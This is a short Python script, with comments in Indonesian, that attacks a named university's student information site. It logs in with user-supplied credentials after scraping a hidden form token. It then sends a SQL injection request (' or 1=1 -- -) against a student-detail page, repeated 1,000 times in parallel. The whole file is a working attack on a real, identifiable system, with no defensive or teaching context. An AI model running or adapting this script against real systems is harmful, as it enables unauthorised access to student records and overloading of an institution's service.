from requests import Session, exceptions
from re import search
from tqdm import tqdm
from sys import argv

try:
    from multiprocessing import Pool
    with Pool() as p:
        pass
    USE_MULTIPROCESSING = True
except ImportError:
    USE_MULTIPROCESSING = False

URL = "http://sion.stikom-bali.ac.id"
RE_STRING = r"<input type=\"hidden\" name=\"flag\" id=\"flag\" class=\"input\" value=\"([a-f0-9]+)\">"
USER_AGENT = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
TOTAL_SHOOT = 1000
DEFAULT_TIMEOUT = 5


def shoot(dummy=None):
    with Session() as s:
        try:
            # ambil flag di halaman login
            response = s.get(URL, timeout=DEFAULT_TIMEOUT)
            flag = search(RE_STRING, response.text).group(1)

            # lakukan login dengan USERNAME dan PASSWORD
            response = s.post(f"{URL}/load_login.php",
                              headers={
                                  "User-Agent": USER_AGENT,
                                  "Referer": URL
                              },
                              data={
                                  "uname": USERNAME,
                                  "passwd": PASSWORD,
                                  "flag": flag
                              },
                              timeout=DEFAULT_TIMEOUT,
                              allow_redirects=False)
            if "/reg" not in response.text:
                raise Exception("Wrong Username and Password")
        except (exceptions.ConnectionError, exceptions.ReadTimeout):
            raise Exception("Connection timeout, is server still alive?")

        try:
            # eksekusi
            response = s.get(
                f"{URL}/reg/mhsdet.php?nim=160010136' or 1=1 -- -",
                headers={
                    "User-Agent": USER_AGENT,
                    "Referer": URL
                },
                timeout=DEFAULT_TIMEOUT)
        except (exceptions.ConnectionError, exceptions.ReadTimeout):
            pass


if __name__ == "__main__":
    if not len(argv) == 3:
        print(f"Usage: python {argv[0]} USERNAME PASSWORD")
        exit(0)

    USERNAME = argv[1]
    PASSWORD = argv[2]
    if USE_MULTIPROCESSING:
        with Pool() as p:
            with tqdm(total=TOTAL_SHOOT) as bar:
                for _ in p.imap_unordered(shoot, range(0, TOTAL_SHOOT)):
                    bar.update()
    else:
        for _ in tqdm(range(TOTAL_SHOOT)):
            shoot()
